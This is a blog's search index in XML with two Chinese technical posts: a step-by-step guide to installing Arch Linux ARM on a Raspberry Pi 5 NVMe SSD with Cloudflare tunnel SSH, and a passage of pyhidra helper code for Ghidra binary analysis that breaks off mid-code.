<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Raspberry Pi 5 安装 Arch Linux</title>
      <link href="/2024/02/09/raspberry-pi5-arch/"/>
      <url>/2024/02/09/raspberry-pi5-arch/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近买的 Pimoroni 的 Nvme SSD 板到了, 就开始往上装 Arch<br>因为我没有 Micro HDMI 的线和读写 SSD 的工具, 就打算和正常装系统一样用个 usb boot 进去里面装,同时也得一直 Headless</p></blockquote><h1 id="0-准备"><a href="#0-准备" class="headerlink" title="0. 准备"></a>0. 准备</h1><ul><li>Raspberry Pi 5</li><li>USB</li><li>网线</li><li>PC</li><li>SSD</li></ul><h1 id="1-准备-USB-Boot"><a href="#1-准备-USB-Boot" class="headerlink" title="1. 准备 USB Boot"></a>1. 准备 USB Boot</h1><p>用 <code>sudo pacman -S rpi-imager</code> 下载 <code>rpi-imager</code> 然后往 USB 里刷一个 <code>Raspberry OS</code> 然后配置好 SSH 密码</p><h1 id="2-USB-Boot-准备"><a href="#2-USB-Boot-准备" class="headerlink" title="2. USB Boot 准备"></a>2. USB Boot 准备</h1><ol start="0"><li>把 USB 插到 Pi 5 上</li><li>把网线从 Pi 上连到 PC, 然后进设置把类型改成 <code>share with other computer</code> <img src="/images/rpi5-arch1.png" alt="share with other computer option"></li><li>用 <code>ip a</code> 拿到 PC 有线的 ip 比如 <code>10.42.0.1</code>, 然后用 <code>nmap -sn 10.42.0.0/24</code>(没有 <code>nmap</code> 就装) 扫 Pi 的 ip (比如我这里是 <code>10.42.0.83</code>)<br><img src="/images/rpi5-arch2.png" alt="ip a"><br><img src="/images/rpi5-arch3.png" alt="nmap"></li><li><code>ssh alarm@10.42.0.83</code> 和前面设的密码连接</li><li><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade</code> 更新一下系统<br>如果通过网线出不了网可能是 <code>dhcpcd</code>, <code>iptable</code> 之类的问题</li><li><code>sudo rpi-eeprom-config -e</code> 里改 <code>BOOT_ORDER</code>, 比如 <code>BOOT_ORDER=0xf64</code> 就是先尝试加载 <code>USB</code> (<code>4</code>) 然后 <code>nvme</code> (<code>6</code>) 然后重复 (<code>f</code>). 参考<a href="https://www.raspberrypi.com/documentation/computers/raspberry-pi.html#BOOT_ORDER">raspberrypi.com&#x2F;documentation&#x2F;computers&#x2F;raspberry-pi.html#BOOT_ORDER</a></li><li><code>sudo rpi-eeprom-update -a</code> 更新一下固件</li></ol><h1 id="3-配置-nvme"><a href="#3-配置-nvme" class="headerlink" title="3. 配置 nvme"></a>3. 配置 nvme</h1><p>参考 <a href="https://shop.pimoroni.com/products/nvme-base?variant=41219587178579">pimoroni</a>, 基本除了更新 pi 的固件不需要配置, 如果 <code>lsblk</code> 看不到 SSD 可能是要重启</p><h1 id="4-安装-Arch"><a href="#4-安装-Arch" class="headerlink" title="4. 安装 Arch"></a>4. 安装 Arch</h1><ol start="0"><li>进 USB boot 的 SSH</li><li>分盘, 我一般用 <code>cfdisk</code> 分(比如 <code>sudo cfdisk /dev/nvme0n1</code>), 最少分两个盘, 一个 <code>&gt;=300Mb</code> 的 boot 和一个主盘’</li><li>用 <code>sudo apt install libarchive-tools</code> 来安装 <code>bsdtar</code></li><li>用 <code>root</code> 运行以下脚本(建议写到一个脚本文件里然后<code>sudo</code>), 脚本来自 <a href="https://kiljan.org/2023/11/24/arch-linux-arm-on-a-raspberry-pi-5-model-b/">kiljan.org&#x2F;2023&#x2F;11&#x2F;24&#x2F;arch-linux-arm-on-a-raspberry-pi-5-model-b</a><br>执行前要去找新的下载链接(见注释)   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># SSD 的路径</span></span><br><span class="line"><span class="built_in">export</span> SDDEV=/dev/nvme0n1</span><br><span class="line"><span class="built_in">export</span> SDPARTBOOT=/dev/nvme0n1p1</span><br><span class="line"><span class="built_in">export</span> SDPARTROOT=/dev/nvme0n1p2</span><br><span class="line"><span class="built_in">export</span> SDMOUNT=/mnt/sd</span><br><span class="line"><span class="built_in">export</span> DOWNLOADDIR=/tmp/pi</span><br><span class="line"><span class="built_in">export</span> DISTURL=<span class="string">&quot;http://os.archlinuxarm.org/os/ArchLinuxARM-rpi-aarch64-latest.tar.gz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$DOWNLOADDIR</span></span><br><span class="line">(</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$DOWNLOADDIR</span> &amp;&amp; \</span><br><span class="line">curl -JLO <span class="variable">$DISTURL</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已经分过盘了</span></span><br><span class="line"><span class="comment">#sfdisk --quiet --wipe always $SDDEV &lt;&lt; EOF</span></span><br><span class="line"><span class="comment">#,256M,0c,</span></span><br><span class="line"><span class="comment">#,,,</span></span><br><span class="line"><span class="comment">#EOF</span></span><br><span class="line"></span><br><span class="line">mkfs.vfat -F 32 <span class="variable">$SDPARTBOOT</span></span><br><span class="line">mkfs.ext4 -E lazy_itable_init=0,lazy_journal_init=0 -F <span class="variable">$SDPARTROOT</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$SDMOUNT</span></span><br><span class="line">mount <span class="variable">$SDPARTROOT</span> <span class="variable">$SDMOUNT</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line">mount <span class="variable">$SDPARTBOOT</span> <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line"></span><br><span class="line">bsdtar -xpf <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/ArchLinuxARM-rpi-aarch64-latest.tar.gz -C <span class="variable">$SDMOUNT</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/*</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/linux-rpi</span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/linux-rpi</span><br><span class="line"><span class="comment"># 这里需要自己去找链接, 不然可能 404</span></span><br><span class="line"><span class="comment"># 去 https://archlinuxarm.org/packages/aarch64/linux-rpi 然后复制下载链接</span></span><br><span class="line">curl -JLO http://mirror.archlinuxarm.org/aarch64/core/linux-rpi-6.6.16-1-aarch64.pkg.tar.xz</span><br><span class="line">tar xf *</span><br><span class="line"><span class="built_in">cp</span> -rf boot/* <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line">umount -R <span class="variable">$SDMOUNT</span></span><br></pre></td></tr></table></figure> 这里是 <code>/boot/firmware</code> 而不是 <code>/boot</code> 参考 <a href="https://www.raspberrypi.com/documentation/computers/configuration.html#the-boot-folder">raspberrypi.com&#x2F;documentation&#x2F;computers&#x2F;configuration.html#the-boot-folder</a>.</li><li>挂载 SSD (可以写成脚本文件)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mount /dev/nvme0n1p2 /mnt/sd</span><br><span class="line">mount /dev/nvme0n1p1 /mnt/sd/boot/firmware</span><br></pre></td></tr></table></figure></li><li>编辑 <code>sudo vim /mnt/sd/etc/fstab</code>, 改成你的盘<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Static information about the filesystems.</span></span><br><span class="line"><span class="comment"># See fstab(5) for details.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span><br><span class="line"><span class="comment"># &lt;pass&gt; is the order of loading parition</span></span><br><span class="line"><span class="comment"># main partition</span></span><br><span class="line">/dev/nvme0n1p2  /               ext4    defaults        0       1</span><br><span class="line"><span class="comment"># boot partition</span></span><br><span class="line">/dev/nvme0n1p1  /boot/firmware  vfat    defaults        0       2</span><br></pre></td></tr></table></figure></li><li>编辑 <code>sudo vim /mnt/sd/boot/firmware/cmdline.txt</code><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root</span>=PARTUUID=<span class="number">00000000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">000000000000</span> rootfstype=ext4 rw rootwait console=serial0,<span class="number">115200</span> console=tty1 fsck.repair=<span class="literal">yes</span></span><br></pre></td></tr></table></figure>我这里用的是盘的 <code>PARTUUID</code>, 理论上用路径或UUID应该也可以, 通过 <code>ls /dev/disk/by-partuuid -al</code>, <code>ls /dev/disk/by-uuid -al</code> 和 <code>lsblk</code> 可以拿到</li><li>关机， 拔掉 USB, 重启</li></ol><h1 id="5-配置-Arch"><a href="#5-配置-Arch" class="headerlink" title="5. 配置 Arch"></a>5. 配置 Arch</h1><ul><li>滚下系统</li><li>[可选] 加 SSH <code>~/.ssh/authorized_keys</code></li><li>同步下时间 <code>ntp</code></li><li>设置 <code>locale</code></li><li>[可选] 安装 <code>zsh</code> <code>omz</code></li><li><h2 id="安装-iwd-来连接无线网-用-iwctl-然后-station-wlan0-connect-来连接-sudo-systemctl-enable-now-iwd-开机启动系统服务-编辑-sudo-vim-etc-iwd-main-conf-加入-来让-wifi-自动连接-使用内置-dhcph-和-ipv6"><a href="#安装-iwd-来连接无线网-用-iwctl-然后-station-wlan0-connect-来连接-sudo-systemctl-enable-now-iwd-开机启动系统服务-编辑-sudo-vim-etc-iwd-main-conf-加入-来让-wifi-自动连接-使用内置-dhcph-和-ipv6" class="headerlink" title="安装 iwd 来连接无线网- 用 iwctl 然后 station wlan0 connect &lt;UID&gt; 来连接- sudo systemctl enable --now iwd 开机启动系统服务- 编辑 sudo vim /etc/iwd/main.conf, 加入    来让 wifi 自动连接, 使用内置 dhcph 和 ipv6"></a>安装 <code>iwd</code> 来连接无线网<br>- 用 <code>iwctl</code> 然后 <code>station wlan0 connect &lt;UID&gt;</code> 来连接<br>- <code>sudo systemctl enable --now iwd</code> 开机启动系统服务<br>- 编辑 <code>sudo vim /etc/iwd/main.conf</code>, 加入<br>  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Settings]</span></span><br><span class="line"><span class="attr">AutoConnect</span>=<span class="literal">true</span></span><br><span class="line"><span class="section">[General]</span></span><br><span class="line"><span class="attr">EnableNetworkConfiguration</span>=<span class="literal">true</span></span><br><span class="line"><span class="section">[Network]</span></span><br><span class="line"><span class="attr">EnableIPv6</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure><br>  来让 wifi 自动连接, 使用内置 <code>dhcph</code> 和 <code>ipv6</code></h2></li><li>[可选?] 安装 <code>dhcph</code><ul><li><code>sudo systemctl enable --now dhcph</code></li><li>[可选?] 在 <code>/etc/dhcpcd.conf</code> 禁用 ipv6</li></ul></li><li>新建用户, 删除 alarm</li><li>改 <code>hostname</code> (默认是 <code>alarm</code>)</li><li>[可选] 安装 <code>linux-rpi-16k</code><ul><li>如果安装后一直 <code>boot</code> 进旧的 也就是 <code>linux-rpi</code> 内核, 可以试着用 <code>/boot/kernel8.img</code> 覆盖 <code>/boot/firmware/kernel8.img</code></li></ul></li><li>[可选] Arch 下的 <code>sudo pacman -S rpi5-eeprom</code> 来更新固件</li><li>[可选] 如果要修复 <code>pacman</code> 里生成 image 的  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==&gt; WARNING: errors were encountered during the build. The image may not be complete.</span><br><span class="line">error: command failed to execute correctly</span><br></pre></td></tr></table></figure>  可以编辑 <code>/etc/mkinitcpio.conf</code> 的 <code>HOOKS</code> 那一行, 去掉 <code>kms</code>  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># removed kms</span></span><br><span class="line"><span class="attr">HOOKS</span>=(base udev autodetect modconf keyboard keymap consolefont block filesystems fsck)</span><br></pre></td></tr></table></figure>  参考 <a href="https://archlinuxarm.org/forum/viewtopic.php?f=15&t=16672&start=40#p72020">archlinuxarm</a></li></ul><h1 id="6-可选-Cloudflare-公网-SSH"><a href="#6-可选-Cloudflare-公网-SSH" class="headerlink" title="6. [可选] Cloudflare 公网 SSH"></a>6. [可选] Cloudflare 公网 SSH</h1><blockquote><p>因为 <code>cloudflare</code> 提供 <code>tunnel</code>, 我们可以用 <code>tunnel</code> 来做 Pi 的公网 SSH (以及其他要公网的服务, 相当于内网穿透)<br>0. 进 pi 的 arch 的 SSH</p></blockquote><ol><li>接下来可以用 docker 的 <code>cloudflared</code> 或者手动编译 (因为 <a href="https://github.com/cloudflare/cloudflared/issues/1151#issuecomment-1888738119">issue#1151</a> 提到在 <code>2024.1.0</code> 后要自己编译 <code>go</code> 标准库, 不然开不了通道), 我这里选的是手动编译</li><li>通过 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cloudflare/go.git</span><br><span class="line"><span class="built_in">cd</span> go/src</span><br><span class="line">./make.bash</span><br></pre></td></tr></table></figure> 编译 <code>cloudflare</code> 的 <code>go</code> 标准库</li><li>把 <code>go/bin/</code> 加到 <code>PATH</code> 里</li><li>通过 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cloudflare/cloudflared.git</span><br><span class="line"><span class="built_in">cd</span> cloudflared</span><br><span class="line">make cloudflared</span><br></pre></td></tr></table></figure> 编译 <code>cloudflared</code></li><li>把 <code>cloudflared/</code> 加到 <code>PATH</code> 里</li><li>在 <code>cloudflare</code> 网页上创建一个 <code>tunnel</code><img src="/images/rpi5-arch4.png" alt="tunnel">然后在里面创建协议为 <code>SSH</code> 的 <code>public hostname</code></li><li>复制 <code>cloudflared</code> 网页上的 <code>tunnel</code> 配置, 比如<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cloudflared service install &lt;TOKEN&gt;</span><br></pre></td></tr></table></figure></li><li><code>sudo systemctl enable --now cloudflared</code></li><li>然后在 pc 上安装 <code>sudo pacman -S cloudflared</code></li><li>在 <code>.ssh/config</code> 里写 <code>cloudflared</code> 的 <code>ProxyCommand</code> 为 <code>cloudflared access ssh --hostname %h</code>, 参考 <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/#native-terminal">developers.cloudflare.com&#x2F;cloudflare-one&#x2F;connections&#x2F;connect-networks&#x2F;use-cases&#x2F;ssh</a></li></ol><center>- 新年快乐 :) -</center>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
            <tag> Raspberry Pi5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 用 pyhidra 调用 Ghidra 执行二进制 static analysis</title>
      <link href="/2023/12/04/python-pyhidra-static-analysis/"/>
      <url>/2023/12/04/python-pyhidra-static-analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="0-Prep"><a href="#0-Prep" class="headerlink" title="0. Prep"></a>0. Prep</h2><ol><li>安装 <code>ghidra</code> <code>pacman -S ghidra</code><br> i. 写入 <code>ghidra</code> 的环境变量 <code>echo &quot;export GHIDRA_INSTALL_DIR=/opt/ghidra&quot; &gt;&gt; ~/.zshrc</code> (视情况而定)</li><li>安装 <a href="https://pypi.org/project/pyhidra/"><code>pyhidra</code></a> <code>pip install pyhidra</code></li><li>[Optional] 安装 <a href="https://pypi.org/project/ghidra-stubs/"><code>ghidra-stub</code></a> <code>pip install ghidra-stub</code></li></ol><h2 id="1-Usage"><a href="#1-Usage" class="headerlink" title="1. Usage"></a>1. Usage</h2><h3 id="1-0-Helper-Tools"><a href="#1-0-Helper-Tools" class="headerlink" title="1.0 Helper Tools"></a>1.0 Helper Tools</h3><p>我对 <code>pyhidra</code> 中的实现做了一些更改:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> helper <span class="keyword">import</span> FAIL</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> atexit</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> GHIDRA_BASE</span><br><span class="line"></span><br><span class="line"><span class="comment"># this file is a modified version pyhidra.core.open_program and pyhidra.core._setup_project</span></span><br><span class="line"><span class="comment"># original credit for pyhidra</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> contextlib</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span>, ContextManager</span><br><span class="line"><span class="keyword">from</span> pyhidra.core <span class="keyword">import</span> _analyze_program, _get_compiler_spec, _get_language</span><br><span class="line"><span class="keyword">from</span> pyhidra.converters <span class="keyword">import</span> *  <span class="comment"># pylint: disable=wildcard-import, unused-wildcard-import</span></span><br><span class="line"><span class="keyword">from</span> ghidra.base.project <span class="keyword">import</span> GhidraProject</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span>, <span class="type">Tuple</span>, ContextManager</span><br><span class="line"><span class="keyword">from</span> ghidra.program.model.listing <span class="keyword">import</span> Program</span><br><span class="line"></span><br><span class="line">_project: GhidraProject | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">_program_pool: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="string">&quot;Program&quot;</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_setup_project2</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: <span class="type">Union</span>[<span class="built_in">str</span>, Path],</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[<span class="string">&quot;GhidraProject&quot;</span>, <span class="string">&quot;Program&quot;</span>]:</span><br><span class="line">    <span class="keyword">from</span> java.io <span class="keyword">import</span> IOException</span><br><span class="line">    <span class="keyword">global</span> _project</span><br><span class="line">    <span class="keyword">assert</span> _project <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        binary_path = Path(binary_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open/Create project</span></span><br><span class="line">    program: <span class="string">&quot;Program&quot;</span> | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    project = _project</span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># if project.getRootFolder().getFile(binary_path.name): # since this not works</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            program = project.openProgram(<span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">except</span> IOException:</span><br><span class="line">            program = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> language <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            program = project.importProgram(binary_path) <span class="comment"># type: ignore</span></span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. Try providing a language manually.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lang = _get_language(language)</span><br><span class="line">            comp = _get_compiler_spec(lang, compiler) <span class="comment"># type: ignore</span></span><br><span class="line">            program = project.importProgram(binary_path, lang, comp) <span class="comment"># type: ignore</span></span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                message = <span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. &quot;</span></span><br><span class="line">                <span class="keyword">if</span> compiler:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language/compiler pair (<span class="subst">&#123;language&#125;</span> / <span class="subst">&#123;compiler&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language (<span class="subst">&#123;language&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(message)</span><br><span class="line">        project.saveAs(program, <span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>) <span class="comment"># True to False</span></span><br><span class="line">    <span class="keyword">assert</span> program <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> program <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_setup_project</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: <span class="type">Union</span>[<span class="built_in">str</span>, Path],</span></span><br><span class="line"><span class="params">        project_location: <span class="type">Union</span>[<span class="built_in">str</span>, Path] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        project_name: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[<span class="string">&quot;GhidraProject&quot;</span>, <span class="string">&quot;Program&quot;</span>]:</span><br><span class="line">    <span class="keyword">from</span> ghidra.base.project <span class="keyword">import</span> GhidraProject</span><br><span class="line">    <span class="keyword">from</span> java.io <span class="keyword">import</span> IOException</span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        binary_path = Path(binary_path)</span><br><span class="line">    <span class="keyword">if</span> project_location:</span><br><span class="line">        project_location = Path(project_location)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        project_location = binary_path.parent</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> project_name:</span><br><span class="line">        project_name = <span class="string">f&quot;<span class="subst">&#123;binary_path.name&#125;</span>_ghidra&quot;</span></span><br><span class="line">    project_location = project_location / project_name</span><br><span class="line">    project_location.mkdir(exist_ok=<span class="literal">True</span>, parents=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open/Create project</span></span><br><span class="line">    program: <span class="string">&quot;Program&quot;</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        project = GhidraProject.openProject(project_location, project_name, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># if project.getRootFolder().getFile(binary_path.name): # since this not 